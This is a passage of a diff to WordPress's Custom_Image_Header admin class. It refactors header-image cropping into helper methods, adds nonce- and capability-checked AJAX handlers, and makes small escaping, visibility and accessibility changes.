 		$custom_header = get_custom_header();
 		$header_image_style = 'background-image:url(' . esc_url( get_header_image() ) . ');';
@@ -484,14 +570,16 @@ class Custom_Image_Header {
 		else
 			$style = ' style="display:none;"';
 		?>
-		<h1><a id="name" class="displaying-header-text" <?php echo $style; ?> onclick="return false;" href="<?php bloginfo('url'); ?>"><?php bloginfo( 'name' ); ?></a></h1>
+		<h1><a id="name" class="displaying-header-text" <?php echo $style; ?> onclick="return false;" href="<?php bloginfo('url'); ?>" tabindex="-1"><?php bloginfo( 'name' ); ?></a></h1>
 		<div id="desc" class="displaying-header-text" <?php echo $style; ?>><?php bloginfo( 'description' ); ?></div>
 	</div>
 	<?php } ?>
 </td>
 </tr>
+<?php endif; ?>
+
 <?php if ( current_theme_supports( 'custom-header', 'uploads' ) ) : ?>
-<tr valign="top">
+<tr>
 <th scope="row"><?php _e( 'Select Image' ); ?></th>
 <td>
 	<p><?php _e( 'You can select an image to be shown at the top of your site by uploading from your computer or choosing from your media library. After selecting an image you will be able to crop it.' ); ?><br />
@@ -529,10 +617,10 @@ class Custom_Image_Header {
 	?>
 	<p>
 		<label for="choose-from-library-link"><?php _e( 'Or choose an image from your media library:' ); ?></label><br />
-		<a id="choose-from-library-link" class="button"
+		<button id="choose-from-library-link" class="button"
 			data-update-link="<?php echo esc_attr( $modal_update_href ); ?>"
 			data-choose="<?php esc_attr_e( 'Choose a Custom Header' ); ?>"
-			data-update="<?php esc_attr_e( 'Set as header' ); ?>"><?php _e( 'Choose Image' ); ?></a>
+			data-update="<?php esc_attr_e( 'Set as header' ); ?>"><?php _e( 'Choose Image' ); ?></button>
 	</p>
 	</form>
 </td>
@@ -542,10 +630,11 @@ class Custom_Image_Header {
 </table>
 
 <form method="post" action="<?php echo esc_url( add_query_arg( 'step', 1 ) ) ?>">
+<?php submit_button( null, 'screen-reader-text', 'save-header-options', false ); ?>
 <table class="form-table">
 <tbody>
 	<?php if ( get_uploaded_header_images() ) : ?>
-<tr valign="top">
+<tr>
 <th scope="row"><?php _e( 'Uploaded Images' ); ?></th>
 <td>
 	<p><?php _e( 'You can choose one of your previously uploaded headers, or show a random one.' ) ?></p>
@@ -556,7 +645,7 @@ class Custom_Image_Header {
 </tr>
 	<?php endif;
 	if ( ! empty( $this->default_headers ) ) : ?>
-<tr valign="top">
+<tr>
 <th scope="row"><?php _e( 'Default Images' ); ?></th>
 <td>
 <?php if ( current_theme_supports( 'custom-header', 'uploads' ) ) : ?>
@@ -571,7 +660,7 @@ class Custom_Image_Header {
 </tr>
 	<?php endif;
 	if ( get_header_image() ) : ?>
-<tr valign="top">
+<tr>
 <th scope="row"><?php _e( 'Remove Image' ); ?></th>
 <td>
 	<p><?php _e( 'This will remove the header image. You will not be able to restore any customizations.' ) ?></p>
@@ -582,7 +671,7 @@ class Custom_Image_Header {
 
 	$default_image = get_theme_support( 'custom-header', 'default-image' );
 	if ( $default_image && get_header_image() != $default_image ) : ?>
-<tr valign="top">
+<tr>
 <th scope="row"><?php _e( 'Reset Image' ); ?></th>
 <td>
 	<p><?php _e( 'This will restore the original header image. You will not be able to restore any customizations.' ) ?></p>
@@ -599,7 +688,7 @@ class Custom_Image_Header {
 
 <table class="form-table">
 <tbody>
-<tr valign="top">
+<tr>
 <th scope="row"><?php _e( 'Header Text' ); ?></th>
 <td>
 	<p>
@@ -608,21 +697,31 @@ class Custom_Image_Header {
 </td>
 </tr>
 
-<tr valign="top" class="displaying-header-text">
+<tr class="displaying-header-text">
 <th scope="row"><?php _e( 'Text Color' ); ?></th>
 <td>
 	<p>
-<?php
-$header_textcolor = display_header_text() ? get_header_textcolor() : get_theme_support( 'custom-header', 'default-text-color' );
-$default_color = '';
-if ( current_theme_supports( 'custom-header', 'default-text-color' ) ) {
-	$default_color = '#' . get_theme_support( 'custom-header', 'default-text-color' );
-	$default_color_attr = ' data-default-color="' . esc_attr( $default_color ) . '"';
-	echo '<input type="text" name="text-color" id="text-color" value="#' . esc_attr( $header_textcolor ) . '"' . $default_color_attr . ' />';
-	if ( $default_color )
-		echo ' <span class="description hide-if-js">' . sprintf( _x( 'Default: %s', 'color' ), $default_color ) . '</span>';
-}
-?>
+	<?php
+	$default_color = '';
+	if ( current_theme_supports( 'custom-header', 'default-text-color' ) ) {
+		$default_color = get_theme_support( 'custom-header', 'default-text-color' );
+		if ( $default_color && false === strpos( $default_color, '#' ) ) {
+			$default_color = '#' . $default_color;
+		}
+	}
+
+	$default_color_attr = $default_color ? ' data-default-color="' . esc_attr( $default_color ) . '"' : '';
+
+	$header_textcolor = display_header_text() ? get_header_textcolor() : get_theme_support( 'custom-header', 'default-text-color' );
+	if ( $header_textcolor && false === strpos( $header_textcolor, '#' ) ) {
+		$header_textcolor = '#' . $header_textcolor;
+	}
+
+	echo '<input type="text" name="text-color" id="text-color" value="' . esc_attr( $header_textcolor ) . '"' . $default_color_attr . ' />';
+	if ( $default_color ) {
+		echo ' <span class="description hide-if-js">' . sprintf( _x( 'Default: %s', 'color' ), esc_html( $default_color ) ) . '</span>';
+	}
+	?>
 	</p>
 </td>
 </tr>
@@ -630,6 +729,11 @@ if ( current_theme_supports( 'custom-header', 'default-text-color' ) ) {
 </table>
 <?php endif;
 
+/**
+ * Fires just before the submit button in the custom header options form.
+ *
+ * @since 3.1.0
+ */
 do_action( 'custom_header_options' );
 
 wp_nonce_field( 'custom-header-options', '_wpnonce-custom-header-options' ); ?>
@@ -645,26 +749,29 @@ wp_nonce_field( 'custom-header-options', '_wpnonce-custom-header-options' ); ?>
 	 *
 	 * @since 2.1.0
 	 */
-	function step_2() {
+	public function step_2() {
 		check_admin_referer('custom-header-upload', '_wpnonce-custom-header-upload');
 		if ( ! current_theme_supports( 'custom-header', 'uploads' ) )
-			wp_die( __( 'Cheatin&#8217; uh?' ) );
+			wp_die( __( 'Cheatin&#8217; uh?' ), 403 );
 
 		if ( empty( $_POST ) && isset( $_GET['file'] ) ) {
 			$attachment_id = absint( $_GET['file'] );
 			$file = get_attached_file( $attachment_id, true );
-			$url = wp_get_attachment_image_src( $attachment_id, 'full');
+			$url = wp_get_attachment_image_src( $attachment_id, 'full' );
 			$url = $url[0];
 		} elseif ( isset( $_POST ) ) {
-			extract($this->step_2_manage_upload());
+			$data = $this->step_2_manage_upload();
+			$attachment_id = $data['attachment_id'];
+			$file = $data['file'];
+			$url = $data['url'];
 		}
 
 		if ( file_exists( $file ) ) {
 			list( $width, $height, $type, $attr ) = getimagesize( $file );
 		} else {
 			$data = wp_get_attachment_metadata( $attachment_id );
-			$height = $data[ 'height' ];
-			$width = $data[ 'width' ];
+			$height = isset( $data[ 'height' ] ) ? $data[ 'height' ] : 0;
+			$width = isset( $data[ 'width' ] ) ? $data[ 'width' ] : 0;
 			unset( $data );
 		}
 
@@ -687,7 +794,16 @@ wp_nonce_field( 'custom-header-options', '_wpnonce-custom-header-options' ); ?>
 
 			$this->set_header_image( compact( 'url', 'attachment_id', 'width', 'height' ) );
 
-			do_action('wp_create_file_in_uploads', $file, $attachment_id); // For replication
+			/**
+			 * Fires after the header image is set or an error is returned.
+			 *
+			 * @since 2.1.0
+			 *
+			 * @param string $file          Path to the file.
+			 * @param int    $attachment_id Attachment ID.
+			 */
+			do_action( 'wp_create_file_in_uploads', $file, $attachment_id ); // For replication
+
 			return $this->finished();
 		} elseif ( $width > $max_width ) {
 			$oitar = $width / $max_width;
@@ -695,7 +811,8 @@ wp_nonce_field( 'custom-header-options', '_wpnonce-custom-header-options' ); ?>
 			if ( ! $image || is_wp_error( $image ) )
 				wp_die( __( 'Image could not be processed. Please go back and try again.' ), __( 'Image Processing Error' ) );
 
-			$image = apply_filters('wp_create_file_in_uploads', $image, $attachment_id); // For replication
+			/** This filter is documented in wp-admin/custom-header.php */
+			$image = apply_filters( 'wp_create_file_in_uploads', $image, $attachment_id ); // For replication
 
 			$url = str_replace(basename($url), basename($image), $url);
 			$width = $width / $oitar;
@@ -706,7 +823,6 @@ wp_nonce_field( 'custom-header-options', '_wpnonce-custom-header-options' ); ?>
 		?>
 
 <div class="wrap">
-<?php screen_icon(); ?>
 <h2><?php _e( 'Crop Header Image' ); ?></h2>
 
 <form method="post" action="<?php echo esc_url(add_query_arg('step', 3)); ?>">
@@ -746,7 +862,7 @@ wp_nonce_field( 'custom-header-options', '_wpnonce-custom-header-options' ); ?>
 	 *
 	 * @since 3.4.0
 	 */
-	function step_2_manage_upload() {
+	public function step_2_manage_upload() {
 		$overrides = array('test_form' => false);
 
 		$uploaded_file = $_FILES['import'];
@@ -783,14 +899,14 @@ wp_nonce_field( 'custom-header-options', '_wpnonce-custom-header-options' ); ?>
 	 *
 	 * @since 2.1.0
 	 */
-	function step_3() {
+	public function step_3() {
 		check_admin_referer( 'custom-header-crop-image' );
 
 		if ( ! current_theme_supports( 'custom-header', 'uploads' ) )
-			wp_die( __( 'Cheatin&#8217; uh?' ) );
+			wp_die( __( 'Cheatin&#8217; uh?' ), 403 );
 
 		if ( ! empty( $_POST['skip-cropping'] ) && ! ( current_theme_supports( 'custom-header', 'flex-height' ) || current_theme_supports( 'custom-header', 'flex-width' ) ) )
-			wp_die( __( 'Cheatin&#8217; uh?' ) );
+			wp_die( __( 'Cheatin&#8217; uh?' ), 403 );
 
 		if ( $_POST['oitar'] > 1 ) {
 			$_POST['x1'] = $_POST['x1'] * $_POST['oitar'];
@@ -802,32 +918,15 @@ wp_nonce_field( 'custom-header-options', '_wpnonce-custom-header-options' ); ?>
 		$attachment_id = absint( $_POST['attachment_id'] );
 		$original = get_attached_file($attachment_id);
 
-
-		$max_width = 0;
-		// For flex, limit size of image displayed to 1500px unless theme says otherwise
-		if ( current_theme_supports( 'custom-header', 'flex-width' ) )
-			$max_width = 1500;
-
-		if ( current_theme_supports( 'custom-header', 'max-width' ) )
-			$max_width = max( $max_width, get_theme_support( 'custom-header', 'max-width' ) );
-		$max_width = max( $max_width, get_theme_support( 'custom-header', 'width' ) );
-
-		if ( ( current_theme_supports( 'custom-header', 'flex-height' ) && ! current_theme_supports( 'custom-header', 'flex-width' ) ) || $_POST['width'] > $max_width )
-			$dst_height = absint( $_POST['height'] * ( $max_width / $_POST['width'] ) );
-		elseif ( current_theme_supports( 'custom-header', 'flex-height' ) && current_theme_supports( 'custom-header', 'flex-width' ) )
-			$dst_height = absint( $_POST['height'] );
-		else
-			$dst_height = get_theme_support( 'custom-header', 'height' );
-
-		if ( ( current_theme_supports( 'custom-header', 'flex-width' ) && ! current_theme_supports( 'custom-header', 'flex-height' ) ) || $_POST['width'] > $max_width )
-			$dst_width = absint( $_POST['width'] * ( $max_width / $_POST['width'] ) );
-		elseif ( current_theme_supports( 'custom-header', 'flex-width' ) && current_theme_supports( 'custom-header', 'flex-height' ) )
-			$dst_width = absint( $_POST['width'] );
-		else
-			$dst_width = get_theme_support( 'custom-header', 'width' );
+		$dimensions = $this->get_header_dimensions( array(
+			'height' => $_POST['height'],
+			'width'  => $_POST['width'],
+		) );
+		$height = $dimensions['dst_height'];
+		$width = $dimensions['dst_width'];
 
 		if ( empty( $_POST['skip-cropping'] ) )
-			$cropped = wp_crop_image( $attachment_id, (int) $_POST['x1'], (int) $_POST['y1'], (int) $_POST['width'], (int) $_POST['height'], $dst_width, $dst_height );
+			$cropped = wp_crop_image( $attachment_id, (int) $_POST['x1'], (int) $_POST['y1'], (int) $_POST['width'], (int) $_POST['height'], $width, $height );
 		elseif ( ! empty( $_POST['create-new-attachment'] ) )
 			$cropped = _copy_image_file( $attachment_id );
 		else
@@ -836,41 +935,37 @@ wp_nonce_field( 'custom-header-options', '_wpnonce-custom-header-options' ); ?>
 		if ( ! $cropped || is_wp_error( $cropped ) )
 			wp_die( __( 'Image could not be processed. Please go back and try again.' ), __( 'Image Processing Error' ) );
 
-		$cropped = apply_filters('wp_create_file_in_uploads', $cropped, $attachment_id); // For replication
+		/** This filter is documented in wp-admin/custom-header.php */
+		$cropped = apply_filters( 'wp_create_file_in_uploads', $cropped, $attachment_id ); // For replication
 
-		$parent = get_post($attachment_id);
-		$parent_url = $parent->guid;
-		$url = str_replace( basename( $parent_url ), basename( $cropped ), $parent_url );
+		$object = $this->create_attachment_object( $cropped, $attachment_id );
 
-		$size = @getimagesize( $cropped );
-		$image_type = ( $size ) ? $size['mime'] : 'image/jpeg';
-
-		// Construct the object array
-		$object = array(
-			'ID' => $attachment_id,
-			'post_title' => basename($cropped),
-			'post_content' => $url,
-			'post_mime_type' => $image_type,
-			'guid' => $url,
-			'context' => 'custom-header'
-		);
 		if ( ! empty( $_POST['create-new-attachment'] ) )
 			unset( $object['ID'] );
 
 		// Update the attachment
-		$attachment_id = wp_insert_attachment( $object, $cropped );
-		wp_update_attachment_metadata( $attachment_id, wp_generate_attachment_metadata( $attachment_id, $cropped ) );
+		$attachment_id = $this->insert_attachment( $object, $cropped );
 
-		$width = $dst_width;
-		$height = $dst_height;
+		$url = $object['guid'];
 		$this->set_header_image( compact( 'url', 'attachment_id', 'width', 'height' ) );
 
-		// cleanup
+		// Cleanup.
 		$medium = str_replace( basename( $original ), 'midsize-' . basename( $original ), $original );
-		if ( file_exists( $medium ) )
+		if ( file_exists( $medium ) ) {
+			/**
+			 * Filter the path of the file to delete.
+			 *
+			 * @since 2.1.0
+			 *
+			 * @param string $medium Path to the file to delete.
+			 */
 			@unlink( apply_filters( 'wp_delete_file', $medium ) );
-		if ( empty( $_POST['create-new-attachment'] ) && empty( $_POST['skip-cropping'] ) )
+		}
+
+		if ( empty( $_POST['create-new-attachment'] ) && empty( $_POST['skip-cropping'] ) ) {
+			/** This filter is documented in wp-admin/custom-header.php */
 			@unlink( apply_filters( 'wp_delete_file', $original ) );
+		}
 
 		return $this->finished();
 	}
@@ -880,7 +975,7 @@ wp_nonce_field( 'custom-header-options', '_wpnonce-custom-header-options' ); ?>
 	 *
 	 * @since 2.1.0
 	 */
-	function finished() {
+	public function finished() {
 		$this->updated = true;
 		$this->step_1();
 	}
@@ -890,7 +985,7 @@ wp_nonce_field( 'custom-header-options', '_wpnonce-custom-header-options' ); ?>
 	 *
 	 * @since 2.1.0
 	 */
-	function admin_page() {
+	public function admin_page() {
 		if ( ! current_user_can('edit_theme_options') )
 			wp_die(__('You do not have permission to customize headers.'));
 		$step = $this->step();
@@ -907,7 +1002,7 @@ wp_nonce_field( 'custom-header-options', '_wpnonce-custom-header-options' ); ?>
 	 *
 	 * @since 3.4.0
 	 */
-	function attachment_fields_to_edit( $form_fields ) {
+	public function attachment_fields_to_edit( $form_fields ) {
 		return $form_fields;
 	}
 
@@ -916,7 +1011,7 @@ wp_nonce_field( 'custom-header-options', '_wpnonce-custom-header-options' ); ?>
 	 *
 	 * @since 3.4.0
 	 */
-	function filter_upload_tabs( $tabs ) {
+	public function filter_upload_tabs( $tabs ) {
 		return $tabs;
 	}
 
@@ -1001,6 +1096,7 @@ wp_nonce_field( 'custom-header-options', '_wpnonce-custom-header-options' ); ?>
 
 		$default = sprintf( $default, get_template_directory_uri(), get_stylesheet_directory_uri() );
 
+		$default_data = array();
 		foreach ( $this->default_headers as $header => $details ) {
 			if ( $details['url'] == $default ) {
 				$default_data = $details;
@@ -1010,5 +1106,276 @@ wp_nonce_field( 'custom-header-options', '_wpnonce-custom-header-options' ); ?>
 
 		set_theme_mod( 'header_image', $default );
 		set_theme_mod( 'header_image_data', (object) $default_data );
+	}
+
+	/**
+	 * Calculate width and height based on what the currently selected theme supports.
+	 *
+	 * @return array dst_height and dst_width of header image.
+	 */
+	final public function get_header_dimensions( $dimensions ) {
+		$max_width = 0;
+		$width = absint( $dimensions['width'] );
+		$height = absint( $dimensions['height'] );
+		$theme_height = get_theme_support( 'custom-header', 'height' );
+		$theme_width = get_theme_support( 'custom-header', 'width' );
+		$has_flex_width = current_theme_supports( 'custom-header', 'flex-width' );
+		$has_flex_height = current_theme_supports( 'custom-header', 'flex-height' );
+		$has_max_width = current_theme_supports( 'custom-header', 'max-width' ) ;
+		$dst = array( 'dst_height' => null, 'dst_width' => null );
+
+		// For flex, limit size of image displayed to 1500px unless theme says otherwise
+		if ( $has_flex_width ) {
+			$max_width = 1500;
+		}
+
+		if ( $has_max_width ) {
+			$max_width = max( $max_width, get_theme_support( 'custom-header', 'max-width' ) );
+		}
+		$max_width = max( $max_width, $theme_width );
+
+		if ( $has_flex_height && ( ! $has_flex_width || $width > $max_width ) ) {
+			$dst['dst_height'] = absint( $height * ( $max_width / $width ) );
+		}
+		elseif ( $has_flex_height && $has_flex_width ) {
+			$dst['dst_height'] = $height;
+		}
+		else {
+			$dst['dst_height'] = $theme_height;
+		}
+
+		if ( $has_flex_width && ( ! $has_flex_height || $width > $max_width ) ) {
+			$dst['dst_width'] = absint( $width * ( $max_width / $width ) );
+		}
+		elseif ( $has_flex_width && $has_flex_height ) {
+			$dst['dst_width'] = $width;
+		}
+		else {
+			$dst['dst_width'] = $theme_width;
+		}
+
+		return $dst;
+	}
+
+	/**
+	 * Create an attachment 'object'.
+	 *
+	 * @param string $cropped Cropped image URL.
+	 * @param int $parent_attachment_id Attachment ID of parent image.
+	 *
+	 * @return array Attachment object.
+	 */
+	final public function create_attachment_object( $cropped, $parent_attachment_id ) {
+		$parent = get_post( $parent_attachment_id );
+		$parent_url = $parent->guid;
+		$url = str_replace( basename( $parent_url ), basename( $cropped ), $parent_url );
+
+		$size = @getimagesize( $cropped );
+		$image_type = ( $size ) ? $size['mime'] : 'image/jpeg';
+
+		$object = array(
+			'ID' => $parent_attachment_id,
+			'post_title' => basename($cropped),
+			'post_content' => $url,
+			'post_mime_type' => $image_type,
+			'guid' => $url,
+			'context' => 'custom-header'
+		);
+
+		return $object;
+	}
+
+	/**
+	 * Insert an attachment and its metadata.
+	 *
+	 * @param array $object Attachment object.
+	 * @param string $cropped Cropped image URL.
+	 *
+	 * @return int Attachment ID.
+	 */
+	final public function insert_attachment( $object, $cropped ) {
+		$attachment_id = wp_insert_attachment( $object, $cropped );
+		$metadata = wp_generate_attachment_metadata( $attachment_id, $cropped );
+		/**
+		 * Filter the header image attachment metadata.
+		 *
+		 * @since 3.9.0
+		 *
+		 * @see wp_generate_attachment_metadata()
+		 *
+		 * @param array $metadata Attachment metadata.
+		 */
+		$metadata = apply_filters( 'wp_header_image_attachment_metadata', $metadata );
+		wp_update_attachment_metadata( $attachment_id, $metadata );
+		return $attachment_id;
+	}
+
+	/**
+	 * Gets attachment uploaded by Media Manager, crops it, then saves it as a
+	 * new object. Returns JSON-encoded object details.
+	 */
+	public function ajax_header_crop() {
+		check_ajax_referer( 'image_editor-' . $_POST['id'], 'nonce' );
+
+		if ( ! current_user_can( 'edit_theme_options' ) ) {
+			wp_send_json_error();
+		}
+
+		if ( ! current_theme_supports( 'custom-header', 'uploads' ) ) {
+			wp_send_json_error();
+		}
+
+		$crop_details = $_POST['cropDetails'];
+
+		$dimensions = $this->get_header_dimensions( array(
+			'height' => $crop_details['height'],
+			'width'  => $crop_details['width'],
+		) );
+
+		$attachment_id = absint( $_POST['id'] );
+
+		$cropped = wp_crop_image(
+			$attachment_id,
+			(int) $crop_details['x1'],
+			(int) $crop_details['y1'],
+			(int) $crop_details['width'],
+			(int) $crop_details['height'],
+			(int) $dimensions['dst_width'],
+			(int) $dimensions['dst_height']
+		);
+
+		if ( ! $cropped || is_wp_error( $cropped ) ) {
+			wp_send_json_error( array( 'message' => __( 'Image could not be processed. Please go back and try again.' ) ) );
+		}
+
+		/** This filter is documented in wp-admin/custom-header.php */
+		$cropped = apply_filters( 'wp_create_file_in_uploads', $cropped, $attachment_id ); // For replication
+
+		$object = $this->create_attachment_object( $cropped, $attachment_id );
+
+		unset( $object['ID'] );
+
+		$new_attachment_id = $this->insert_attachment( $object, $cropped );
+
+		$object['attachment_id'] = $new_attachment_id;
+		$object['width']         = $dimensions['dst_width'];
+		$object['height']        = $dimensions['dst_height'];
+
+		wp_send_json_success( $object );
+	}
+
+	/**
+	 * Given an attachment ID for a header image, updates its "last used"
+	 * timestamp to now.
+	 *
+	 * Triggered when the user tries adds a new header image from the
+	 * Media Manager, even if s/he doesn't save that change.
+	 */
+	public function ajax_header_add() {
+		check_ajax_referer( 'header-add', 'nonce' );
+
+		if ( ! current_user_can( 'edit_theme_options' ) ) {
+			wp_send_json_error();
+		}
+
+		$attachment_id = absint( $_POST['attachment_id'] );
+		if ( $attachment_id < 1 ) {
+			wp_send_json_error();
+		}
+
+		$key = '_wp_attachment_custom_header_last_used_' . get_stylesheet();
+		update_post_meta( $attachment_id, $key, time() );
+		update_post_meta( $attachment_id, '_wp_attachment_is_custom_header', get_stylesheet() );
+
+		wp_send_json_success();
+	}
+
+	/**
+	 * Given an attachment ID for a header image, unsets it as a user-uploaded
+	 * header image for the current theme.
+	 *
+	 * Triggered when the user clicks the overlay "X" button next to each image
+	 * choice in the Customizer's Header tool.
+	 */
+	public function ajax_header_remove() {
+		check_ajax_referer( 'header-remove', 'nonce' );
+
+		if ( ! current_user_can( 'edit_theme_options' ) ) {
+			wp_send_json_error();
+		}
+
+		$attachment_id = absint( $_POST['attachment_id'] );
+		if ( $attachment_id < 1 ) {
+			wp_send_json_error();
+		}
+
+		$key = '_wp_attachment_custom_header_last_used_' . get_stylesheet();
+		delete_post_meta( $attachment_id, $key );
+		delete_post_meta( $attachment_id, '_wp_attachment_is_custom_header', get_stylesheet() );
+
+		wp_send_json_success();
+	}
+
+	public function customize_set_last_used( $wp_customize ) {
+		$data = $wp_customize->get_setting( 'header_image_data' )->post_value();
+
+		if ( ! isset( $data['attachment_id'] ) ) {
+			return;
+		}
+
+		$attachment_id = $data['attachment_id'];
+		$key = '_wp_attachment_custom_header_last_used_' . get_stylesheet();
+		update_post_meta( $attachment_id, $key, time() );
+	}
+
+	public function get_default_header_images() {
+		$this->process_default_headers();
+
+		// Get the default image if there is one.
+		$default = get_theme_support( 'custom-header', 'default-image' );
+
+		if ( ! $default ) { // If not,
+			return $this->default_headers; // easy peasy.
+		}
+
+		$default = sprintf( $default, get_template_directory_uri(), get_stylesheet_directory_uri() );
+		$already_has_default = false;
+
+		foreach ( $this->default_headers as $k => $h ) {
+			if ( $h['url'] === $default ) {
+				$already_has_default = true;
+				break;
+			}
+		}
+
+		if ( $already_has_default ) {
+			return $this->default_headers;
+		}
+
+		// If the one true image isn't included in the default set, prepend it.
+		$header_images = array();
+		$header_images['default'] = array(
+			'url'           => $default,
+			'thumbnail_url' => $default,
+			'description'   => 'Default'
+		);
+
+		// The rest of the set comes after.
+		$header_images = array_merge( $header_images, $this->default_headers );
+		return $header_images;
+	}
+
+	public function get_uploaded_header_images() {
+		$header_images = get_uploaded_header_images();
+		$timestamp_key = '_wp_attachment_custom_header_last_used_' . get_stylesheet();
+		$alt_text_key = '_wp_attachment_image_alt';
+
+		foreach ( $header_images as &$header_image ) {
+			$header_meta = get_post_meta( $header_image['attachment_id'] );
+			$header_image['timestamp'] = isset( $header_meta[ $timestamp_key ] ) ? $header_meta[ $timestamp_key ] : '';
+			$header_image['alt_text'] = isset( $header_meta[ $alt_text_key ] ) ? $header_meta[ $alt_text_key ] : '';
+		}
+
+		return $header_images;
 	}
 }
